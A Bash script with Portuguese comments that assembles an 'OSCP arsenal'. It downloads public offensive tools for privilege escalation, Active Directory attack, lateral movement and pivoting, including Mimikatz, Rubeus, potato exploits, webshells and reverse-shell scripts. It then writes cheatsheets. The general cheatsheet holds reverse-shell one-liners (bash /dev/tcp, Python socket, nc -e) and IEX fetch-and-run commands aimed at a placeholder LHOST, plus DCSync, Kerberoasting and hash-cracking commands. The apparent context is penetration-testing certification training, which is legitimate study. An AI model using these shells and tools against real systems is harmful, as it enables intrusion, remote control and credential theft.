#!/bin/bash

# ===========================
# OSCP Arsenal Setup Script v2.1 (Fixed)
# ===========================

set -e

ARSENAL_DIR="$HOME/arsenal"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log_ok() { echo -e "${GREEN}[+]${NC} $1"; }
log_info() { echo -e "${YELLOW}[*]${NC} $1"; }
log_fail() { echo -e "${RED}[-]${NC} $1"; }

download() {
    local url="$1"
    local output="$2"
    if curl -fSL --connect-timeout 10 --max-time 120 -o "$output" "$url" 2>/dev/null; then
        log_ok "$(basename "$output")"
    else
        log_fail "$(basename "$output") - $url"
    fi
}

log_info "Criando estrutura de pastas..."
mkdir -p "$ARSENAL_DIR"/{windows/{privesc,enum,shells,transfer},linux/{privesc,enum,shells},ad/{enum,exploit,lateral},pivoting,webshells,wordlists}

cd "$ARSENAL_DIR"

# ===========================
# WINDOWS - PRIVESC
# ===========================
log_info "Baixando Windows Privesc tools..."

download "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe" "windows/privesc/winPEASx64.exe"
download "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe" "windows/privesc/winPEASx86.exe"
download "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat" "windows/privesc/winPEAS.bat"
download "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" "windows/privesc/PowerUp.ps1"

# FIX: PrivescCheck agora usa releases em vez de arquivo raw no master
# O repo mudou a estrutura - baixar via releases ou do branch correto
log_info "Baixando PrivescCheck..."
if curl -fSL -o windows/privesc/privesccheck.zip "https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.zip" 2>/dev/null; then
    unzip -oq windows/privesc/privesccheck.zip -d windows/privesc/PrivescCheck/ 2>/dev/null
    rm -f windows/privesc/privesccheck.zip
    log_ok "PrivescCheck (via release)"
else
    # Fallback: tentar baixar o .ps1 diretamente do branch master (pode nao existir como arquivo unico)
    if curl -fSL -o windows/privesc/privesccheck_repo.zip "https://github.com/itm4n/PrivescCheck/archive/refs/heads/master.zip" 2>/dev/null; then
        unzip -oq windows/privesc/privesccheck_repo.zip -d windows/privesc/
        mv windows/privesc/PrivescCheck-master windows/privesc/PrivescCheck 2>/dev/null
        rm -f windows/privesc/privesccheck_repo.zip
        log_ok "PrivescCheck (via repo clone)"
    else
        log_fail "PrivescCheck"
    fi
fi

download "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe" "windows/privesc/Seatbelt.exe"
download "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe" "windows/privesc/SharpUp.exe"
download "https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe" "windows/privesc/PrintSpoofer64.exe"
download "https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer32.exe" "windows/privesc/PrintSpoofer32.exe"
download "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe" "windows/privesc/GodPotato-NET4.exe"
download "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET2.exe" "windows/privesc/GodPotato-NET2.exe"

# JuicyPotatoNG
if curl -fSL -o windows/privesc/JuicyPotatoNG.zip "https://github.com/antonioCoco/JuicyPotatoNG/releases/latest/download/JuicyPotatoNG.zip" 2>/dev/null; then
    unzip -oq windows/privesc/JuicyPotatoNG.zip -d windows/privesc/
    rm -f windows/privesc/JuicyPotatoNG.zip
    log_ok "JuicyPotatoNG"
else
    log_fail "JuicyPotatoNG"
fi

# FIX: SweetPotato nao tem releases binarias no repo oficial CCob/SweetPotato
# Baixar binario pre-compilado de repo alternativo ou clonar o source
log_info "Baixando SweetPotato..."
if curl -fSL -o windows/privesc/SweetPotato.zip "https://github.com/uknowsec/SweetPotato/releases/latest/download/SweetPotato.zip" 2>/dev/null; then
    unzip -oq windows/privesc/SweetPotato.zip -d windows/privesc/
    rm -f windows/privesc/SweetPotato.zip
    log_ok "SweetPotato (via uknowsec)"
else
    # Fallback: clonar source do repo original
    if curl -fSL -o windows/privesc/SweetPotato_src.zip "https://github.com/CCob/SweetPotato/archive/refs/heads/master.zip" 2>/dev/null; then
        unzip -oq windows/privesc/SweetPotato_src.zip -d windows/privesc/
        mv windows/privesc/SweetPotato-master windows/privesc/SweetPotato_src 2>/dev/null
        rm -f windows/privesc/SweetPotato_src.zip
        log_ok "SweetPotato (source - precisa compilar)"
    else
        log_fail "SweetPotato"
    fi
fi

# ===========================
# WINDOWS - ENUM
# ===========================
log_info "Baixando Windows Enum tools..."

# Accesschk
if curl -fSL -o windows/enum/accesschk.zip "https://download.sysinternals.com/files/AccessChk.zip" 2>/dev/null; then
    unzip -oq windows/enum/accesschk.zip -d windows/enum/
    rm -f windows/enum/accesschk.zip windows/enum/Eula.txt 2>/dev/null
    log_ok "AccessChk"
else
    log_fail "AccessChk"
fi

# Mimikatz
if curl -fSL -o windows/enum/mimikatz.zip "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" 2>/dev/null; then
    unzip -oq windows/enum/mimikatz.zip -d windows/enum/mimikatz/
    rm -f windows/enum/mimikatz.zip
    log_ok "Mimikatz"
else
    log_fail "Mimikatz"
fi

# FIX: SharpHound mudou para SpecterOps/SharpHound - usar latest release em vez de versao hardcoded
log_info "Baixando SharpHound..."
SHARPHOUND_URL=$(curl -fsSL "https://api.github.com/repos/SpecterOps/SharpHound/releases/latest" 2>/dev/null | grep -oP '"browser_download_url": "\K[^"]+\.zip' | head -1)
if [ -n "$SHARPHOUND_URL" ]; then
    if curl -fSL -o windows/enum/SharpHound.zip "$SHARPHOUND_URL" 2>/dev/null; then
        unzip -oq windows/enum/SharpHound.zip -d windows/enum/SharpHound/
        rm -f windows/enum/SharpHound.zip
        log_ok "SharpHound (latest via SpecterOps)"
    else
        log_fail "SharpHound"
    fi
else
    # Fallback: tentar URL direta com versao conhecida
    if curl -fSL -o windows/enum/SharpHound.zip "https://github.com/SpecterOps/SharpHound/releases/download/v2.10.0/SharpHound-v2.10.0.zip" 2>/dev/null; then
        unzip -oq windows/enum/SharpHound.zip -d windows/enum/SharpHound/
        rm -f windows/enum/SharpHound.zip
        log_ok "SharpHound v2.10.0"
    else
        log_fail "SharpHound"
    fi
fi

# ===========================
# WINDOWS - SHELLS
# ===========================
log_info "Baixando Windows Shells..."

download "https://github.com/int0x33/nc.exe/raw/master/nc64.exe" "windows/shells/nc64.exe"
download "https://github.com/int0x33/nc.exe/raw/master/nc.exe" "windows/shells/nc.exe"
download "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1" "windows/shells/powercat.ps1"
download "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" "windows/shells/Invoke-PowerShellTcp.ps1"
download "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1" "windows/shells/Invoke-PowerShellTcpOneLine.ps1"
download "https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1" "windows/shells/Invoke-ConPtyShell.ps1"

# ===========================
# WINDOWS - TRANSFER
# ===========================
log_info "Criando Windows Transfer scripts..."

cat > windows/transfer/wget.ps1 << 'YOUREOF'
$webclient = New-Object System.Net.WebClient
$url = $args[0]
$outfile = $args[1]
$webclient.DownloadFile($url,$outfile)
YOUREOF

cat > windows/transfer/download.vbs << 'YOUREOF'
dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments(1), 2
end with
YOUREOF

download "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" "windows/transfer/plink.exe"

log_ok "Transfer scripts criados"

# ===========================
# LINUX - PRIVESC
# ===========================
log_info "Baixando Linux Privesc tools..."

download "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" "linux/privesc/linpeas.sh"
download "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" "linux/privesc/LinEnum.sh"
download "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" "linux/privesc/les.sh"
download "https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl" "linux/privesc/les2.pl"
download "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64" "linux/privesc/pspy64"
download "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32" "linux/privesc/pspy32"
download "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" "linux/privesc/lse.sh"

chmod +x linux/privesc/* 2>/dev/null

# ===========================
# LINUX - ENUM
# ===========================
log_info "Baixando Linux Enum tools..."

# FIX: unix-privesc-check - o arquivo esta no branch 1_x, nao no master
# O master tem upc.sh (versao modular), o 1_x tem o script unico classico
download "https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/1_x/unix-privesc-check" "linux/enum/unix-privesc-check"
chmod +x linux/enum/* 2>/dev/null

# ===========================
# LINUX - SHELLS
# ===========================
log_info "Baixando Linux Shells..."

download "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat" "linux/shells/nc"
chmod +x linux/shells/nc 2>/dev/null

# ===========================
# PIVOTING
# ===========================
log_info "Baixando Pivoting tools..."

# Chisel - usando versao fixa para garantir que funciona
log_info "Baixando Chisel..."
CHISEL_VER="1.10.1"
download "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_linux_amd64.gz" "pivoting/chisel_linux64.gz"
download "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_linux_386.gz" "pivoting/chisel_linux32.gz"
download "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_windows_amd64.gz" "pivoting/chisel_win64.exe.gz"
download "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_windows_386.gz" "pivoting/chisel_win32.exe.gz"

gunzip -f pivoting/chisel_linux64.gz 2>/dev/null && chmod +x pivoting/chisel_linux64
gunzip -f pivoting/chisel_linux32.gz 2>/dev/null && chmod +x pivoting/chisel_linux32
gunzip -f pivoting/chisel_win64.exe.gz 2>/dev/null
gunzip -f pivoting/chisel_win32.exe.gz 2>/dev/null

# Ligolo-ng - usando versao fixa
log_info "Baixando Ligolo-ng..."
LIGOLO_VER="0.7.2-alpha"
download "https://github.com/nicocha30/ligolo-ng/releases/download/v${LIGOLO_VER}/ligolo-ng_proxy_${LIGOLO_VER}_linux_amd64.tar.gz" "pivoting/ligolo_proxy.tar.gz"
download "https://github.com/nicocha30/ligolo-ng/releases/download/v${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER}_linux_amd64.tar.gz" "pivoting/ligolo_agent_linux.tar.gz"
download "https://github.com/nicocha30/ligolo-ng/releases/download/v${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER}_windows_amd64.zip" "pivoting/ligolo_agent_win.zip"

if [ -f pivoting/ligolo_proxy.tar.gz ]; then
    tar -xzf pivoting/ligolo_proxy.tar.gz -C pivoting/ 2>/dev/null
    rm -f pivoting/ligolo_proxy.tar.gz
    chmod +x pivoting/ligolo-ng_proxy* 2>/dev/null
    mv pivoting/ligolo-ng_proxy* pivoting/ligolo_proxy 2>/dev/null
fi

if [ -f pivoting/ligolo_agent_linux.tar.gz ]; then
    tar -xzf pivoting/ligolo_agent_linux.tar.gz -C pivoting/ 2>/dev/null
    rm -f pivoting/ligolo_agent_linux.tar.gz
    chmod +x pivoting/ligolo-ng_agent* 2>/dev/null
    mv pivoting/ligolo-ng_agent pivoting/ligolo_agent_linux 2>/dev/null
fi

if [ -f pivoting/ligolo_agent_win.zip ]; then
    unzip -oq pivoting/ligolo_agent_win.zip -d pivoting/ 2>/dev/null
    rm -f pivoting/ligolo_agent_win.zip
    mv pivoting/ligolo-ng_agent.exe pivoting/ligolo_agent.exe 2>/dev/null
fi

# Socat static
download "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" "pivoting/socat_linux"
chmod +x pivoting/socat_linux 2>/dev/null

# sshuttle install script
cat > pivoting/sshuttle_install.sh << 'YOUREOF'
#!/bin/bash
# sshuttle - VPN over SSH
sudo apt install sshuttle -y
# Usage: sshuttle -r user@pivot_host 10.10.10.0/24
YOUREOF

# proxychains config template
cat > pivoting/proxychains_template.conf << 'YOUREOF'
# proxychains template for OSCP
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
# Chisel SOCKS
socks5 127.0.0.1 1080

# Ligolo (if using)
# socks5 127.0.0.1 1080
YOUREOF

# Rpivot
log_info "Baixando Rpivot..."
if curl -fSL -o pivoting/rpivot.zip "https://github.com/klsecservices/rpivot/archive/refs/heads/master.zip" 2>/dev/null; then
    unzip -oq pivoting/rpivot.zip -d pivoting/
    mv pivoting/rpivot-master pivoting/rpivot 2>/dev/null
    rm -f pivoting/rpivot.zip
    log_ok "Rpivot"
else
    log_fail "Rpivot"
fi

# ReGeorg webshells
log_info "Baixando ReGeorg..."
download "https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.aspx" "pivoting/tunnel.aspx"
download "https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.php" "pivoting/tunnel.php"
download "https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.jsp" "pivoting/tunnel.jsp"

# Neo-reGeorg (versao melhorada)
log_info "Baixando Neo-reGeorg..."
if curl -fSL -o pivoting/neoreg.zip "https://github.com/L-codes/Neo-reGeorg/archive/refs/heads/master.zip" 2>/dev/null; then
    unzip -oq pivoting/neoreg.zip -d pivoting/
    mv pivoting/Neo-reGeorg-master pivoting/neo-regeorg 2>/dev/null
    rm -f pivoting/neoreg.zip
    log_ok "Neo-reGeorg"
else
    log_fail "Neo-reGeorg"
fi

# Pivoting cheatsheet
cat > pivoting/PIVOTING_CHEATSHEET.md << 'YOUREOF'
# Pivoting Cheatsheet

## Chisel

### Setup (Kali - Server)
```bash
./chisel_linux64 server -p 8000 --reverse
```

### Windows Client (Reverse SOCKS)
```cmd
chisel_win64.exe client KALI_IP:8000 R:socks
```

### Linux Client (Reverse SOCKS)
```bash
./chisel_linux64 client KALI_IP:8000 R:socks
```

### Port Forward Especifico
```bash
# Forward porta 3389 do alvo para localhost:3389
./chisel_linux64 client KALI_IP:8000 R:3389:TARGET_IP:3389
```

### Usar com proxychains
```bash
# /etc/proxychains4.conf -> socks5 127.0.0.1 1080
proxychains nmap -sT -Pn TARGET
proxychains evil-winrm -i TARGET -u user -p pass
```

---

## Ligolo-ng

### Setup (Kali)
```bash
# Criar interface TUN
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Iniciar proxy
./ligolo_proxy -selfcert
```

### Agent (Target)
```bash
# Linux
./ligolo_agent_linux -connect KALI_IP:11601 -ignore-cert

# Windows
ligolo_agent.exe -connect KALI_IP:11601 -ignore-cert
```

### Dentro do Ligolo Console
```
session         # Seleciona sessao
ifconfig        # Ver interfaces do alvo
start           # Iniciar tunnel
```

### Adicionar rotas (Kali)
```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

---

## SSH Tunneling

### Local Port Forward
```bash
# Acessa porta no alvo via SSH
ssh -L 8080:127.0.0.1:80 user@pivot
# Agora localhost:8080 -> alvo:80
```

### Remote Port Forward
```bash
# Expoe porta local no alvo
ssh -R 4444:127.0.0.1:4444 user@pivot
```

### Dynamic SOCKS Proxy
```bash
ssh -D 1080 user@pivot
# Usar com proxychains
```

### sshuttle (VPN-like)
```bash
sshuttle -r user@pivot 10.10.10.0/24
# Todo trafego para 10.10.10.0/24 vai pelo pivot
```

---

## Socat

### Port Forward
```bash
# No pivot: forward 8080 -> target:80
./socat TCP-LISTEN:8080,fork TCP:TARGET:80
```

### Reverse Shell Relay
```bash
# Pivot escuta e redireciona para Kali
./socat TCP-LISTEN:4444,fork TCP:KALI:4444
```

---

## Double Pivot (A -> B -> C)

### Chisel Chain
```bash
# Kali (server)
./chisel server -p 8000 --reverse

# Pivot1 (client + server)
./chisel client KALI:8000 R:1080:socks &
./chisel server -p 9000 --reverse

# Pivot2 (client)
./chisel client PIVOT1:9000 R:1081:socks
```

### Proxychains Chain
```
# /etc/proxychains4.conf
strict_chain
socks5 127.0.0.1 1080
socks5 127.0.0.1 1081
```

---

## Tips

1. Sempre teste conectividade primeiro (ping, nc, curl)
2. Firewall bloqueando? Use portas 80, 443, 53
3. Lento? Use keepalive: chisel ... --keepalive 30s
YOUREOF

log_ok "Pivoting cheatsheet criado"

# ===========================
# AD - ENUM
# ===========================
log_info "Baixando AD Enum tools..."

download "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" "ad/enum/PowerView.ps1"
download "https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1" "ad/enum/Import-ActiveDirectory.ps1"
download "https://github.com/samratashok/ADModule/raw/master/Microsoft.ActiveDirectory.Management.dll" "ad/enum/Microsoft.ActiveDirectory.Management.dll"
download "https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1" "ad/enum/adPEAS.ps1"

# Snaffler
if curl -fSL -o ad/enum/Snaffler.zip "https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.zip" 2>/dev/null; then
    unzip -oq ad/enum/Snaffler.zip -d ad/enum/
    rm -f ad/enum/Snaffler.zip
    log_ok "Snaffler"
else
    log_fail "Snaffler"
fi

# ===========================
# AD - EXPLOIT
# ===========================
log_info "Baixando AD Exploit tools..."

download "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" "ad/exploit/Rubeus.exe"
download "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe" "ad/exploit/Certify.exe"
download "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Whisker.exe" "ad/exploit/Whisker.exe"
download "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" "ad/exploit/Invoke-Mimikatz.ps1"
download "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64" "ad/exploit/kerbrute_linux"
download "https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe" "ad/exploit/kerbrute.exe"
download "https://raw.githubusercontent.com/fortra/impacket/master/examples/GetUserSPNs.py" "ad/exploit/GetUserSPNs.py"
download "https://raw.githubusercontent.com/fortra/impacket/master/examples/secretsdump.py" "ad/exploit/secretsdump.py"
download "https://raw.githubusercontent.com/fortra/impacket/master/examples/psexec.py" "ad/exploit/psexec.py"

chmod +x ad/exploit/kerbrute_linux 2>/dev/null

# ===========================
# AD - LATERAL MOVEMENT
# ===========================
log_info "Baixando AD Lateral Movement tools..."

download "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-TheHash.ps1" "ad/lateral/Invoke-TheHash.ps1"
download "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1" "ad/lateral/Invoke-WMIExec.ps1"
download "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1" "ad/lateral/Invoke-SMBExec.ps1"

# PSTools
if curl -fSL -o ad/lateral/PSTools.zip "https://download.sysinternals.com/files/PSTools.zip" 2>/dev/null; then
    unzip -oq ad/lateral/PSTools.zip -d ad/lateral/pstools/
    rm -f ad/lateral/PSTools.zip
    log_ok "PSTools"
else
    log_fail "PSTools"
fi

# ===========================
# WEBSHELLS
# ===========================
log_info "Baixando Webshells..."

download "https://raw.githubusercontent.com/BlackArch/webshells/master/php/simple-backdoor.php" "webshells/simple-backdoor.php"
download "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" "webshells/php-reverse-shell.php"
download "https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx" "webshells/cmdasp.aspx"
download "https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp" "webshells/cmd.jsp"

# ===========================
# WORDLISTS
# ===========================
log_info "Criando referencia de wordlists..."

cat > wordlists/README.md << 'YOUREOF'
# Wordlists

## Kali Default
- /usr/share/wordlists/rockyou.txt
- /usr/share/seclists/

## Passwords
- rockyou.txt
- /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
- /usr/share/seclists/Passwords/darkweb2017-top10000.txt

## Usernames
- /usr/share/seclists/Usernames/Names/names.txt
- /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

## Web Fuzzing
- /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
- /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
- /usr/share/seclists/Discovery/Web-Content/common.txt
- /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

## AD Usernames
- /usr/share/seclists/Usernames/cirt-default-usernames.txt

## SecLists Install (if missing)
sudo apt install seclists -y
YOUREOF

log_ok "Wordlists README criado"

# ===========================
# CHEATSHEET GERAL
# ===========================
log_info "Criando cheatsheet geral..."

cat > "$ARSENAL_DIR/CHEATSHEET.md" << 'YOUREOF'
# Arsenal Cheatsheet

## Servir arquivos
```bash
# Python
python3 -m http.server 80

# PHP
php -S 0.0.0.0:80

# SMB (impacket)
impacket-smbserver share . -smb2support

# Com autenticacao (bypass algumas restricoes)
impacket-smbserver share . -smb2support -user test -password test
```

## Download no Windows
```powershell
# PowerShell
iwr http://LHOST/file -o file
(New-Object Net.WebClient).DownloadFile('http://LHOST/file','C:\file')
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/script.ps1')"

# Certutil
certutil -urlcache -f http://LHOST/file file

# Bitsadmin
bitsadmin /transfer job /download /priority high http://LHOST/file C:\file

# SMB
copy \\LHOST\share\file .
```

## Download no Linux
```bash
wget http://LHOST/file
curl http://LHOST/file -o file
```

## Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell (via powercat)
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://LHOST/powercat.ps1');powercat -c LHOST -p LPORT -e cmd"

# Netcat
nc -e /bin/bash LHOST LPORT
```

## Upgrade Shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 150
```

## AD Quick Wins
```powershell
# PowerView
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetGroup
Find-LocalAdminAccess
Invoke-ShareFinder

# Kerberoast
.\Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP Roast
.\Rubeus.exe asreproast /outfile:asrep.txt

# DCSync (precisa de privilegios)
.\mimikatz.exe "lsadump::dcsync /user:Administrator" exit
```

## Hashes
```bash
# Crack com hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt

# Crack com john
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
YOUREOF

log_ok "Cheatsheet criado"

# ===========================
# ADICIONAR BINARIOS AO PATH
# ===========================
log_info "Adicionando binários ao PATH..."

BIN_DIR="$HOME/.local/bin"
mkdir -p "$BIN_DIR"

# Kerbrute
ln -sf "$ARSENAL_DIR/ad/exploit/kerbrute_linux" "$BIN_DIR/kerbrute"

# Chisel
ln -sf "$ARSENAL_DIR/pivoting/chisel_linux64" "$BIN_DIR/chisel"

# Ligolo
ln -sf "$ARSENAL_DIR/pivoting/ligolo_proxy" "$BIN_DIR/ligolo-proxy"
ln -sf "$ARSENAL_DIR/pivoting/ligolo_agent_linux" "$BIN_DIR/ligolo-agent"

# pspy
ln -sf "$ARSENAL_DIR/linux/privesc/pspy64" "$BIN_DIR/pspy"

# Socat static
ln -sf "$ARSENAL_DIR/pivoting/socat_linux" "$BIN_DIR/socat-static"

# Garantir que ~/.local/bin esta no PATH
if ! echo "$PATH" | grep -q "$BIN_DIR"; then
    echo 'export PATH="$HOME/.local/bin:$PATH"' >> "$HOME/.zshrc" 2>/dev/null
    echo 'export PATH="$HOME/.local/bin:$PATH"' >> "$HOME/.bashrc" 2>/dev/null
    log_info "PATH atualizado em .zshrc e .bashrc (reabra o terminal ou rode: source ~/.zshrc)"
fi

log_ok "Symlinks criados em $BIN_DIR"

# ===========================
# FINALIZAR
# ===========================
echo ""
echo "========================================"
log_ok "Arsenal criado em: $ARSENAL_DIR"
echo "========================================"
echo ""
TOTAL=$(find "$ARSENAL_DIR" -type f 2>/dev/null | wc -l)
log_info "Total de arquivos: $TOTAL"
echo ""
log_info "Estrutura:"
tree -L 2 "$ARSENAL_DIR" 2>/dev/null || find "$ARSENAL_DIR" -maxdepth 2 -type d | sort
echo ""
log_info "Pivoting tools: $ARSENAL_DIR/pivoting/"
log_info "Cheatsheet: $ARSENAL_DIR/CHEATSHEET.md"
log_info "Pivoting guide: $ARSENAL_DIR/pivoting/PIVOTING_CHEATSHEET.md"
